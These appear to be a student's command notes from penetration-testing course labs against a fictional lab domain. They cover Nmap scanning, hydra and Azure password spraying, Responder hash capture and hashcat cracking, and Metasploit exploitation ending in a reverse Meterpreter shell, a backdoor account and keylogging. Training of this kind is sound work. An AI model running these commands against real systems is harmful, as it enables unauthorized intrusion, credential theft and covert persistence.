## Version scanning, OS Detection, NSE, and GoWitness

1: The nmap-service-probes File
`grep -v ^# /usr/share/nmap/nmap-service-probes | cut -d' ' -f1 | sort | uniq -c`

2: Version scan of .25
`sudo nmap -n -p 25 10.130.10.25 -sV`

3: Examining a Service with Netcat
`nc -nv 10.130.10.25 25`

 If we run it with -C, Netcat will send CRLF as the line ending, which will allow us to interact with SMTP. Let's connect to the mail server again and see if we can send an email!

`nc -nvC 10.130.10.25 25`

4: Version Scan of .10
`sudo nmap -n -F 10.130.10.10`

5: The script.db File
We will now look at the functionality of the Nmap Scripting Engine. Start by opening up the file that contains the inventory of all the scripts that have been defined for NSE. Let's take a look at the first 10 lines of the file using head.

`head /usr/share/nmap/scripts/script.db`

6: The ssh-auth-methods Script
The ssh-auth-methods script is used to identify the login methods available on an SSH server. Ideally, SSH servers only allow key based authentication and password authentication is disabled. We can check the hosts in the range to see the authentication methods allowed.

Run Nmap targeting the range using the script ssh-auth-methods. Let's just look at the .10 host.
`sudo nmap -n --open -F --script=ssh-auth-methods 10.130.10.10`

7: Examining the ssh-auth-methods Script
`sudo nmap -n --open -F --script=ssh-auth-methods 10.130.10.10 -sV`

8: SMB Scripts
`ls /usr/share/nmap/scripts/smb*.nse`

command line arguments: `--script-args=smbuser=ADMIN_USER,smbpass=ADMIN_PASSWORD,config=CONFIG_FILE_NAME`

9: The smb2-security-mode Script
`sudo nmap -n -PS445 -p 445 --script=smb2-security-mode --open 10.130.10.0/24`

10: The smb-protocols Script
`sudo nmap -n -PS445 -p 445 --open --script=smb-protocols 10.130.10.4,44`

11: OS Fingerprinting
`sudo nmap -n -p 445 --open --script=smb-os-discovery.nse 10.130.10.4,44`

The script detects that 10.130.10.44 is running Window Server 2022 Datacenter 20348, the hostname of 10.130.10.44 is file01, and the domain is hiboxy.com. This is useful information that we may need later in our pen test! We didn't get any results for 10.130.10.4, though. Let's add Nmap's debug option (-d) to the end of the command to figure out why.

`sudo nmap -n -p 445 --open --script=smb-os-discovery.nse 10.130.10.4,44 -d`

12: Better OS Fingerprinting Techniques
`sudo nmap -n -PS3389 -p 3389 --open 10.130.10.4,44 --script rdp-ntlm-info`

13: HTTP NSE Scripts
`sudo nmap -v -p*http* -oG -`

14: GoWitness
```
mkdir gowitness && cd gowitness
gowitness scan nmap -f /tmp/webservers.xml --write-db -s screenshots 
```

## Password Guessing

1: Password Spray (SMB)

Please replace SEASONYEAR in the following command to the current season and year in the northern hemisphere, such as Summer2024.

`hydra -L /opt/passwords/facebook-f.last-100.txt -p SEASONYEAR -m workgroup:{hiboxy} 10.130.10.4 smb2`

2: The dictionary

`for Y in 1 24 25 26; do printf '%s\n' {Password,Welcome,Spring,Summer,Fall,Autumn,Winter}"$Y"{,\!} | tee -a simple.txt; done`

3: Password Guessing (SSH)
`hydra -l bgreen -P simple.txt 10.130.10.10 ssh`

4: Verifying Access
`nmap -n -PS445 -p 445 --open 10.130.10.0/24 -oG - | awk '/Up/ { print $2 }' | tee 445.tcp`

Let's use hydra to see if these credentials are valid on the Windows systems.

`hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M 445.tcp smb2`

5: Breached Credentials
`hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.4 -m workgroup:{hiboxy} smb2`

6: Password Spraying all domain users
`GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.4 -all | tee adusers.txt`
`tail -n +6 adusers.txt | cut -d ' ' -f 1 | tee domainusers.txt`

Now that we have a list of domain users, let's try spraying with Password1.
`hydra -L domainusers.txt -p Password1 -m workgroup:{hiboxy} 10.130.10.4 smb2`

## Azure Recon and Password Spraying

1: Loading AADInternals
`Import-Module AADInternals`

2: Invoke-AADIntReconAsOutsider
`Invoke-AADIntReconAsOutsider -DomainName hiboxy.com | Format-Table`

3: Invoke-AADIntUserEnumerationAsOutsider
`Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com"`

There are 3 APIs that this module hits for the attack:

Normal (Not specified): GetCredentialType API
Login: Attempts a standard user log in; attempts are logged in Sign-In Logs
Autologon: Uses the autologon API; this API does not leave a log event

`Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com" -Method Login`

4: Username harvesting attacks
`Get-Content C:\CourseFiles\users.txt | Invoke-AADIntUserEnumerationAsOutsider`

Let's build a list of just the users that exist.

`Get-Content C:\CourseFiles\users.txt | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName`

5: Prep Attack on Linux
Switch to your Linux system and create the userlist based on the information above. Note, we want just usernames and do not want it formatted like email addresses.

```
cat << EOF > /tmp/users.txt
abates@hiboxy.com
aparker@hiboxy.com
mlara@hiboxy.com
slopez@hiboxy.com
EOF
```
Let's also create a passwords.txt file using passwords cracked in an earlier lab.

```
cat << EOF > /tmp/passwords.txt
Oozle11
Password123
Packardbell350
Metallica6
Tibbetts3
Patrique2238
EOF
```

6: Password Spray Attack
We will be using trevorspray from our Linux VM for the password spraying attack.

`trevorspray --recon hiboxy.com`

It's amazing how much information we can get from just a domain name. We now have the URL we need to spray against. Let's use it in our attack:

`trevorspray --users /tmp/users.txt --passwords /tmp/passwords.txt --url 'https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token'`

7: Displaying the output of our attack
Notice the results are saved to a file. In our example, the file is /home/sec560/.trevorspray/valid_logins.txt. Let's examine that content:

`cat /home/sec560/.trevorspray/valid_logins.txt`

## Responder

1: Launch Responder
`sudo Responder.py -I eth0`

the next few steps is signing out of windows vm and then signing in with the clark account, then accessing the responders filepath in file explorer which sends clarks hash over. 

Then we can crack it with hashcat:

`hashcat -m 5600 /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-* /usr/share/wordlists/rockyou.txt`

then view it: 
`hashcat -m 5600 /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-*  --show`

2: Capturing hashes with a sniffer

`sudo tcpdump -nv -w /tmp/winauth.pcap port 445`

To simulate a user authenticating, we'll authenticate to our Windows VM as the user clark with the password Qwerty12. In the other Linux terminal, type:

`smbclient //YOUR_WINDOWS_IP_ADDRESS/c$ -U clark --password=Qwerty12`

When you press Enter in Linux to run the smbclient command, you see a NT_STATUS_ACCESS_DENIED response. More importantly, your tcpdump sniffer in the other window should show that you've captured some packets. You should see tcpdump output saying it has Got XX packets, where XX will be 11 or more.

7: Extract hashes from Pcap file
We will use PCredz to extract the password hashes from the pcap file. The tool can extract "Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface."

The PCredz tool is particular in where and how it is run. We need to run it from the directory containing the Pcredz executable.

`sudo /pentest/password-recovery/pcredz/Pcredz -vf /tmp/winauth.pcap`

We have the hash in the proper format so that we can then use hashcat to crack it.
`hashcat -m 5600 /pentest/password-recovery/pcredz/logs/NTLMv2.txt /usr/share/wordlists/rockyou.txt`

## Metasploit and Meterpreter

start Metasploit:
`msfconsole`

see exploits: `show exploits`

searching exploits: `search cassandra`

search filters: `search type:exploit jmx`

using exploit: `ues exploit/multi/misc/java_jmx_server`

showing payloads: `show payloads`

setting payload: `set PAYLOAD java/meterpreter/reverse_http`

setting options: `show options`
```
set RHOSTS WINDOWS_ETHERNET0_ADDRESS
set RPORT 7199
set LPORT 8443
```

some have checks to check vulnerability status:
`check`

3: Launch the attack

`exploit`

4: Sessions
can background the current shell with: `background`

check sessions: `sessions`

can rename with -n: `sessions -n cassandra_win11 -i 1`

interact with a session: `sessions -i 1`

5: Meterpreter

getting info about the system:
`sysinfo`

determine our username:
`getuid`

see processes: `ps`

searching processes: `ps -S java.exe`

determine what our current process ID is: `getpid`

6: Shell
getting into a shell on the system: `shell`

can run normal commands like: `hostname, ipconfig, dir, net user`

which can be used to create a backdoor user: `net user BACKDOOR Password1 /add`

validate if it is created: `net user BACKDOOR`

7: More Meterpreter Features
can screenshot: `screenshot -p /home/sec560/screenshot.jpg`

8: Upgrading Meterpreter & Migrating Processes
There are limitations to using the Java Meterpreter payload. For example, some of the more advanced features, such as migrate, are not implemented in the Java Meterpreter payload. If you were to try to run migrate -h to see the migrate help information, it will tell you it's not supported. That's because it depends on the privs module, which isn't supported either. Entering load privs to try to force it would produce an error, too.

to start send session to background: `background`

To use those features, we'll need to upgrade our Java Meterpreter to a regular Meterpreter shell. There is a post-exploitation module to do that for us called post/windows/manage/shell_to_meterpreter. We could enter use and the module name, configure all of the details, and then run it; however, the sessions command includes a -u option to "upgrade" a shell. It runs the same post exploitation modules, but it's way easier to remember and type.

Before we can upgrade our shell, we have to handle a bug in the current Meterpreter payload. The most recent version of Metasploit added the unhook module as an auto loaded module, which is the source of the bug. Along with stdapi and privs. We're going to set a global MSF environment variable to prevent that from happening. Then we can upgrade our shell
```
setg AutoLoadExtensions stdapi,priv
sessions -u 1
```

a new session should have been created, then it can be interacted with `sessions -i 2`

Now, we will migrate Meterpreter from the java.exe process into an explorer.exe process. We use explorer.exe because it will generally remain running as long as the user is logged in.

To do this, we need the to get the current process ID for explorer.exe, which we can get with ps -S explorer.exe (capital S) to search for the process by name.

`ps -S explorer.exe`

We can jump to the explorer.exe process by process ID, or we can specify the name with the -N option.

Then, to jump into that process, we will use the migrate command. Here, we're using the -N option to migrate by process name, which is more convenient.

`migrate -N explorer.exe`

if it is successful, you'll see a message saying so

9: Keystroke logging

log keystrokes with: `keyscan_start`

once they've been captured you can dump with `keyscan_dump`

10: Cleaning Up
just use `exit`

